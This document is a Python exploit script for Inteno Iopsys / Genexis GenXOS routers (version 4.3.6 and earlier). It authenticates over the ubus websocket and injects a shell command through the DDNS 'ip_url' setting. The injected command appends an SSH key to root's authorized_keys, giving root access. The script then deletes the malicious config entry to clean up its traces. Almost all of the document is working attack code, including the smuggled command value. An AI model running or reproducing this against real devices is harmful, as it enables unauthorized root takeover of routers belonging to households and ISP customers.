#!/usr/bin/python3

import json
import sys
import os
import time
import argparse
from websocket import create_connection


"""
Root access via DDNS Web IP Retreival Method wget command line injection in Inteno's Iopsys or Genexis' GenXOS <= 4.3.6

Usage: smbexploit.py -i <host> -u <user> <password> <path/to/id_rsa.pub>

Requires:
websocket-client

On Windows:
pyreadline

"""


def ubusAuth(host, username, password):
    ws = create_connection("ws://" + host, header=["Sec-WebSocket-Protocol: ubus-json"])
    req = json.dumps(
        {
            "jsonrpc": "2.0",
            "method": "call",
            "params": [
                "00000000000000000000000000000000",
                "session",
                "login",
                {"username": username, "password": password},
            ],
            "id": 666,
        }
    )
    ws.send(req)
    response = json.loads(ws.recv())
    ws.close()
    try:
        key = response.get("result")[1].get("ubus_rpc_session")
    except IndexError:
        return None
    return key


def ubusCall(host, key, namespace, argument, params={}):
    ws = create_connection("ws://" + host, header=["Sec-WebSocket-Protocol: ubus-json"])
    req = json.dumps(
        {
            "jsonrpc": "2.0",
            "method": "call",
            "params": [key, namespace, argument, params],
            "id": 666,
        }
    )
    ws.send(req)
    response = json.loads(ws.recv())
    ws.close()
    try:
        result = response.get("result")[1]
    except IndexError:
        if response.get("result")[0] == 0:
            return True
        return None
    return result


def main(args):
    print("Reading SSH key...")
    try:
        with open(args.key_path, "r") as fd:
            sshkey = fd.read()
    except IOError:
        print(f"[-] Error reading {args.key_path}")
        sys.exit(1)

    print("Authenticating...")
    key = ubusAuth(args.host, args.user, args.passwd)

    ddns = ubusCall(args.host, key, "uci", "add", {
        "config": "ddns",
        "name": "ddns_exploit",
        "type": "service",
        "values": {
            "": "ddns_exploit",
            "enabled": "1",
            "use_syslog": "0",
            "use_https": "0",
            "force_interval": "0",
            "retry_unit": "hours",
            "use_ipv6": "0",
            "ip_source": "web",
            "update_url": "0",
            "lookup_host": "0",
            "ip_url": f"'; echo '{sshkey}' >> /etc/dropbear/authorized_keys; echo '"
            }
        })
    if not ddns:
        print("[-] Changing ddns config failed!")
        sys.exit(1)

    print("Committing changes...")
    commited_exploit = ubusCall(args.host, key, "uci", "commit", {"config": "ddns"})
    if not commited_exploit:
        print("[-] Failed to commit exploit!")

    print("Waiting 10 seconds for the changes to take effect...")
    time.sleep(10)

    print("Cleaning up...")
    removed = ubusCall(args.host, key, "uci", "delete", {
        "config": "ddns",
        "section": "ddns_exploit"
        })
    if not removed:
        print("[-] Failed to clean up!")
    else:
        commited_clean = ubusCall(args.host, key, "uci", "commit", {"config": "ddns"})
        if not commited_clean:
            print("[-] Failed to commit clean up!")
        else:
            print("All done :)")

    print(f"Try to connect via: ssh -i {os.path.dirname(args.key_path)}/id_rsa root@{args.host}")


def parse_args(args):
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", dest="host", help="Target host", default="192.168.1.1")
    parser.add_argument("-u", dest="user", help="Username", default="user")
    parser.add_argument(dest="passwd", help="Password")
    parser.add_argument(dest="key_path", help="Public ssh key path")

    if len(sys.argv) < 2:
        parser.print_help()
        sys.exit(1)

    return parser.parse_args(args)

if __name__ == "__main__":
    main(parse_args(sys.argv[1:]))

